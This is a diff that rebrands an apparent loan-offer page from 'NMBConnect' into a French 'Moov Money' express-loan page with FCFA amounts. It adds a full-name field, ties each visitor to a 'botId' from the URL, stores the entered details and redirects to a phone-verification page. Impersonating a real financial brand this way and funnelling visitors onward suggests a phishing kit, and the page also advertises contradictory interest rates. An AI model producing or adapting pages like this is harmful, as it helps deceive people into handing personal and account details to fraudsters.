@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NMBConnect - Loan Calculator</title>
+<title>Moov Money - Prêt express</title>
 
 <style>
 *{
@@ -14,7 +14,7 @@ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-
 }
 
 body{
-background: #4a2b7a;
+background: #9A0000;
 min-height:100vh;
 display:flex;
 justify-content:center;
@@ -37,35 +37,35 @@ position:relative;
     margin-bottom: 20px;
 }
 
-.nmb-logo {
+.moov-logo {
     display: inline-flex;
     align-items: center;
     gap: 10px;
     text-decoration: none;
 }
 
-.nmb-logo .logo-icon {
+.moov-logo .logo-icon {
     width: 40px;
     height: 40px;
-    background: #4a2b7a;
+    background: #9A0000;
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
     color: white;
-    font-size: 20px;
+    font-size: 18px;
     font-weight: 700;
 }
 
-.nmb-logo .logo-text {
+.moov-logo .logo-text {
     font-size: 22px;
     font-weight: 700;
     color: #1a1a2e;
     letter-spacing: 0.5px;
 }
 
-.nmb-logo .logo-text span {
-    color: #4a2b7a;
+.moov-logo .logo-text span {
+    color: #9A0000;
 }
 
 .header {
@@ -102,6 +102,35 @@ position:relative;
     text-align: center;
 }
 
+/* --- NEW: NAME INPUT --- */
+.name-input-wrap {
+    margin-bottom: 16px;
+}
+
+.name-input-wrap label {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    color: #555;
+    margin-bottom: 4px;
+    letter-spacing: 0.3px;
+}
+
+.name-input-wrap input {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 10px;
+    border: 1px solid #ddd;
+    font-size: 15px;
+    color: #1a1a2e;
+    background: #ffffff;
+    outline: none;
+    transition: border-color 0.3s;
+}
+.name-input-wrap input:focus {
+    border-color: #9A0000;
+}
+
 .card .label {
     color: #777;
     font-size: 12px;
@@ -125,7 +154,7 @@ position:relative;
     appearance: none;
     height: 6px;
     border-radius: 3px;
-    background: linear-gradient(to right, #4a2b7a 0%, #4a2b7a 50%, #ddd 50%, #ddd 100%);
+    background: linear-gradient(to right, #9A0000 0%, #9A0000 50%, #ddd 50%, #ddd 100%);
     outline: none;
     transition: background 0.2s;
 }
@@ -136,16 +165,16 @@ position:relative;
     width: 20px;
     height: 20px;
     border-radius: 50%;
-    background: #4a2b7a;
+    background: #9A0000;
     cursor: pointer;
-    box-shadow: 0 2px 8px rgba(74, 43, 122, 0.3);
+    box-shadow: 0 2px 8px rgba(154, 0, 0, 0.3);
 }
 
 .slider::-moz-range-thumb {
     width: 20px;
     height: 20px;
     border-radius: 50%;
-    background: #4a2b7a;
+    background: #9A0000;
     cursor: pointer;
     border: none;
 }
@@ -172,7 +201,7 @@ position:relative;
 }
 
 .term-section .months-display {
-    color: #4a2b7a;
+    color: #9A0000;
     font-size: 16px;
     font-weight: 600;
     text-align: center;
@@ -198,13 +227,13 @@ position:relative;
 }
 
 .term:hover {
-    border-color: #4a2b7a;
-    color: #4a2b7a;
+    border-color: #9A0000;
+    color: #9A0000;
 }
 
 .term.active {
-    background: #4a2b7a;
-    border-color: #4a2b7a;
+    background: #9A0000;
+    border-color: #9A0000;
     color: white;
 }
 
@@ -240,7 +269,7 @@ position:relative;
 .apply-btn {
     width: 100%;
     padding: 15px;
-    background: #4a2b7a;
+    background: #9A0000;
     border: none;
     border-radius: 12px;
     color: white;
@@ -253,9 +282,9 @@ position:relative;
 }
 
 .apply-btn:hover {
-    background: #3a1f5e;
+    background: #7a0000;
     transform: translateY(-1px);
-    box-shadow: 0 6px 20px rgba(74, 43, 122, 0.35);
+    box-shadow: 0 6px 20px rgba(154, 0, 0, 0.35);
 }
 
 .apply-btn:active {
@@ -283,7 +312,7 @@ position:relative;
     width: 36px;
     height: 36px;
     border-radius: 50%;
-    background: #4a2b7a;
+    background: #9A0000;
     display: flex;
     align-items: center;
     justify-content: center;
@@ -319,29 +348,23 @@ position:relative;
         padding: 28px 20px 25px;
         border-radius: 22px;
     }
-    
     .header h1 {
         font-size: 20px;
     }
-    
-    .nmb-logo .logo-text {
+    .moov-logo .logo-text {
         font-size: 20px;
     }
-    
     .amount {
         font-size: 24px;
     }
-    
     .term-buttons {
         grid-template-columns: repeat(3, 1fr);
         gap: 6px;
     }
-    
     .term {
         font-size: 11px;
         padding: 6px;
     }
-    
     .info-grid {
         grid-template-columns: 1fr;
     }
@@ -354,68 +377,74 @@ position:relative;
 <div class="app">
 
     <div class="logo-container">
-        <div class="nmb-logo">
-            <div class="logo-icon">N</div>
-            <div class="logo-text">NMB<span>Connect</span></div>
+        <div class="moov-logo">
+            <div class="logo-icon">M</div>
+            <div class="logo-text">Moov <span>Money</span></div>
         </div>
     </div>
 
     <div class="header">
-        <h1>Get Your Loan Approved Fast</h1>
-        <div class="subtitle">Quick approval • Competitive rates • Flexible terms</div>
+        <h1>Obtenez votre prêt rapidement</h1>
+        <div class="subtitle">Approbation rapide • Taux compétitifs • Durées flexibles</div>
     </div>
 
     <div class="card">
 
-        <h2>Loan Calculator</h2>
+        <h2>Simulateur de prêt</h2>
 
-        <div class="label">LOAN AMOUNT</div>
-        <div class="amount" id="loanAmount">$100</div>
-
-        <input type="range" min="100" max="50000" value="100" step="100" class="slider" id="loanSlider">
-
-        <div class="labels">
-            <span>$100</span>
-            <span>$50,000</span>
+        <!-- NAME INPUT -->
+        <div class="name-input-wrap">
+            <label for="fullNameInput">Votre nom complet</label>
+            <input type="text" id="fullNameInput" placeholder="Ex: Jean Dupont" required />
         </div>
 
-        <div class="min-notice">💰 Minimum loan amount: $100</div>
+        <div class="label">MONTANT DU PRÊT</div>
+        <div class="amount" id="loanAmount">4 000 FCFA</div>
+
+        <input type="range" min="4000" max="25000000" value="4000" step="1000" class="slider" id="loanSlider">
+
+        <div class="labels">
+            <span>4 000 FCFA</span>
+            <span>25 000 000 FCFA</span>
+        </div>
+
+        <div class="min-notice">💰 Montant minimum : 4 000 FCFA</div>
 
         <div class="term-section">
-            <div class="term-label">LOAN TERM</div>
-            <div class="months-display" id="months">12 months</div>
+            <div class="term-label">DURÉE DU PRÊT</div>
+            <div class="months-display" id="months">12 mois</div>
 
             <div class="term-buttons">
-                <button class="term" data-month="6">6 mo</button>
-                <button class="term active" data-month="12">12 mo</button>
-                <button class="term" data-month="24">24 mo</button>
-                <button class="term" data-month="36">36 mo</button>
-                <button class="term" data-month="48">48 mo</button>
-                <button class="term" data-month="60">60 mo</button>
+                <button class="term" data-month="6">6 mois</button>
+                <button class="term active" data-month="12">12 mois</button>
+                <button class="term" data-month="24">24 mois</button>
+                <button class="term" data-month="36">36 mois</button>
+                <button class="term" data-month="48">48 mois</button>
+                <button class="term" data-month="60">60 mois</button>
             </div>
         </div>
 
         <div class="result">
-            <div class="result-label">MONTHLY PAYMENT</div>
-            <div class="payment" id="payment">$0.00</div>
-            <div class="rate-info">Interest rate: 4.5% APR</div>
+            <div class="result-label">PAIEMENT MENSUEL</div>
+            <div class="payment" id="payment">0 FCFA</div>
+            <div class="rate-info">Taux d'intérêt : 4,5 % TAEG</div>
         </div>
 
-        <button class="apply-btn" onclick="applyLoan()">APPLY NOW</button>
+        <button class="apply-btn" onclick="applyLoan()">FAIRE LA DEMANDE</button>
 
         <div class="info-grid">
             <div class="info">
                 <div class="icon">⚡</div>
                 <div class="info-text">
-                    <b>Fast Approval</b>
-                    <small>Within 24 hours</small>
+                    <b>Approbation rapide</b>
+                    <small>Sous 24 heures</small>
                 </div>
             </div>
             <div class="info">
                 <div class="icon">💰</div>
                 <div class="info-text">
-                    <b>Low Rates</b>
-                    <small>From 8%</small>
+                    <b>Taux bas</b>
+                    <small>À partir de 8%</small>
                 </div>
             </div>
         </div>
@@ -425,70 +454,84 @@ position:relative;
 </div>
 
 <script>
-// ---------- BOT ID FROM URL ----------
+// ---------- BOT ID ----------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
 
 if (!botId) {
-    alert("Invalid access link");
+    alert("Lien d'accès invalide");
     throw new Error();
 }
 
-// ---------- SAVE SESSION ----------
 localStorage.setItem("botId", botId);
-// Ensure fullName is always set
-if (!localStorage.getItem('fullName')) {
-    localStorage.setItem('fullName', 'Loan Customer');
-}
 
-// ---------- CALCULATOR LOGIC ----------
-let slider = document.getElementById("loanSlider");
-let loanAmount = document.getElementById("loanAmount");
-let payment = document.getElementById("payment");
-let monthsDisplay = document.getElementById("months");
+// ---------- DOM REFS ----------
+const nameInput = document.getElementById('fullNameInput');
+const slider = document.getElementById('loanSlider');
+const loanAmount = document.getElementById('loanAmount');
+const payment = document.getElementById('payment');
+const monthsDisplay = document.getElementById('months');
 
 let months = 12;
 const rate = 0.045 / 12;
 
+// ---------- CALCULATE ----------
 function calculate() {
     let P = parseFloat(slider.value);
     let n = months;
     let r = rate;
     let M = (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
     if (isNaN(M) || !isFinite(M)) M = 0;
-    loanAmount.innerText = "$" + Number(P).toLocaleString();
-    payment.innerText = "$" + M.toFixed(2);
+    
+    loanAmount.innerText = Number(P).toLocaleString('fr-FR') + ' FCFA';
+    payment.innerText = Math.round(M).toLocaleString('fr-FR') + ' FCFA';
+    
     const min = parseFloat(slider.min);
     const max = parseFloat(slider.max);
     const percent = ((P - min) / (max - min)) * 100;
-    slider.style.background = `linear-gradient(to right, #4a2b7a 0%, #4a2b7a ${percent}%, #ddd ${percent}%, #ddd 100%)`;
+    slider.style.background = `linear-gradient(to right, #9A0000 0%, #9A0000 ${percent}%, #ddd ${percent}%, #ddd 100%)`;
 }
 
 slider.oninput = calculate;
 
+// ---------- TERM BUTTONS ----------
 document.querySelectorAll(".term").forEach(btn => {
     btn.onclick = function() {
         document.querySelectorAll(".term").forEach(b => b.classList.remove("active"));
         this.classList.add("active");
         months = parseInt(this.dataset.month);
-        monthsDisplay.innerText = months + " months";
+        monthsDisplay.innerText = months + " mois";
         calculate();
     };
 });
 
-// ---------- APPLY NOW ----------
+// ---------- APPLY LOAN ----------
 function applyLoan() {
-    const amount = parseFloat(slider.value);
-    if (amount < 100) {
-        alert('⚠️ Minimum loan amount is $100');
+    // 1. Validate name
+    const fullName = nameInput.value.trim();
+    if (!fullName) {
+        alert('⚠️ Veuillez entrer votre nom complet.');
+        nameInput.focus();
         return;
     }
+
+    // 2. Validate amount
+    const amount = parseFloat(slider.value);
+    if (amount < 4000) {
+        alert('⚠️ Le montant minimum est de 4 000 FCFA');
+        return;
+    }
+
+    // 3. Save all data
+    localStorage.setItem("fullName", fullName);
     localStorage.setItem("loanAmount", slider.value);
     localStorage.setItem("loanTerm", months);
-    localStorage.setItem("fullName", "Loan Customer"); // double‑check
+
+    // 4. Redirect to phone verification
     window.location.href = `details.html?botId=${botId}`;
 }
 
+// ---------- INIT ----------
 calculate();
 </script>
 
